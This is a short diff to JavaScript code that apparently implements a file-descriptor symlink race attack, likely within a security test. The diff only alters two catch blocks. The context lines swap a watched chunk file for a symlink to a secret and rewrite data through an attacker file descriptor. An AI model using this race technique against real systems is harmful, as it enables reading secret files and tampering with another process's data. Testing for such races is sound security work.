@@ -113,7 +113,7 @@ try {
         let target = "";
         try {
           target = fs.readlinkSync("/proc/self/fd/" + String(fd));
-        } catch {}
+        } catch { target = ""; }
         if (path.resolve(target.replace(/ \(deleted\)$/u, "")) === path.resolve(chunkPath)) {
           fs.renameSync(chunkPath, backup);
           fs.symlinkSync(secret, chunkPath);
@@ -154,7 +154,7 @@ try {
         let target = "";
         try {
           target = fs.readlinkSync("/proc/self/fd/" + String(fd));
-        } catch {}
+        } catch { target = ""; }
         if (path.resolve(target.replace(/ \(deleted\)$/u, "")) === path.resolve(chunkPath)) {
           fs.ftruncateSync(attackerFd, 0);
           let offset = 0;
